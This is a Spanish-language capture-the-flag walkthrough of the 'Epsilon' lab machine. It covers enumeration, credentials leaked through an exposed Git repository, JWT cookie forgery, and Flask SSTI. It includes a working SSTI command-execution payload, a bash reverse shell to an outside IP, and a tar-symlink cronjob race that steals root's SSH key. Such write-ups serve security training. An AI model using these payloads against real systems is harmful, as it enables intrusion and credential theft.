Overview

Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en los commits de Git, lo que permite obtener la clave secreta utilizada para firmar JWT en la aplicación Flask. Con esta clave podemos falsificar cookies de administrador y acceder a rutas protegidas. Finalmente, se escala a root abusando de un cronjob que ejecuta tar con la opción -h, lo que permite reemplazar archivos críticos mediante enlaces simbólicos.

Key steps

  1. Escaneo y enumeración de puertos con nmap.
  2. Enumeración de la aplicación web y volcado del repositorio Git.
  3. Análisis de scripts Python y extracción de credenciales AWS Lambda.
  4. Generación de token JWT con la clave secreta para acceso administrativo.
  5. Explotación SSTI en la aplicación Flask para obtener shell.
  6. Escalada de privilegios usando cronjob con tar y enlaces simbólicos.

1. Enumeración de puertos

El primer paso es identificar qué servicios están expuestos. Se realiza un escaneo completo de todos los puertos TCP abiertos con nmap, buscando obtener información rápida y detallada sin alertar demasiado al sistema.

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134

Explicación de los flags:

  • -p-: Escanea todos los 65535 puertos.
  • --open: Solo muestra los puertos abiertos.
  • -sT: Escaneo TCP completo (stealth limitado).
  • --min-rate 5000: Envía al menos 5000 paquetes por segundo para acelerar el escaneo.
  • -vvv: Máxima verbosidad, muestra progreso detallado.
  • -n: Evita resolución de DNS.
  • -Pn: No realiza ping antes de escanear.

Resultados obtenidos:

22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  http

Observamos que el servidor expone SSH, HTTP estándar y un servidor HTTP adicional en el puerto 5000. Esto indica que hay una aplicación web corriendo en 5000 y posiblemente un sitio público en 80.

2. Enumeración HTTP y volcado del repositorio Git

Se analiza el puerto 80. Al abrir el sitio web se recibe un código 403, lo que indica que el acceso está prohibido, pero es posible que el repositorio Git esté presente en /.git. Usamos gitdumper para volcarlo:

./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo

Archivos importantes encontrados:

  • server.py: Contiene la lógica de autenticación con JWT.
  • track_api_CR_148.py: Contiene credenciales de AWS y lógica para Lambda.

track_api_CR_148.py

Al revisar el commit original:

aws_access_key_id='AQLA5M37BDN6FJP76TDC'
aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
region_name='us-east-1'
endpoint_url='http://cloud.epsilong.htb'

Se observa que las credenciales de AWS Lambda están codificadas directamente en el script, junto con la URL del endpoint. Esto nos permitirá enumerar funciones Lambda usando AWS CLI.

server.py

secret = '<secret_key>'

@app.route("/", methods=["GET","POST"])
def index():
    if request.method=="POST":
        if request.form['username']=="admin" and request.form['password']=="admin":
            res = make_response()
            token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
            res.set_cookie("auth",token)
            res.headers['location']='/home'
            return res,302

El script define rutas para login, /home, /track y /order. Observamos que la autenticación se realiza mediante un JWT firmado con secret. Conocer este valor es crítico para falsificar cookies y acceder como administrador.

4. Explotación y acceso inicial

Se genera un token JWT de administrador usando PyJWT:

import jwt
secret = 'VALOR_EXTRAIDO_DEL_LAMBDA'
token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
print(token)

Este token se coloca en la cookie auth para obtener acceso a la ruta /home:

curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home

Ahora tenemos acceso administrativo a la aplicación web.

Explotación SSTI

En /order se identifica que los campos de entrada son evaluados en render_template_string, lo que permite SSTI. Probamos un payload básico para verificar la vulnerabilidad:

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

Con esto se confirma que podemos ejecutar comandos en el servidor.

Se obtiene reverse shell usando bash:

bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"

5. Escalada de privilegios

Se utiliza pspy para enumerar cronjobs y detectar backups periódicos con tar:

#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*

Se aprovecha la opción -h de tar para crear un enlace simbólico apuntando a /root/.ssh/id_rsa:

#!/bin/bash
while true; do 
    if [ -e /opt/backups/checksum ]; then 
        rm -f /opt/backups/checksum
        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
        break
    fi; 
done

Una vez capturada la clave privada, se conecta vía SSH como root:

ssh -i id_rsa root@10.10.10.134

Con esto se completa el acceso completo a la máquina Epsilon.
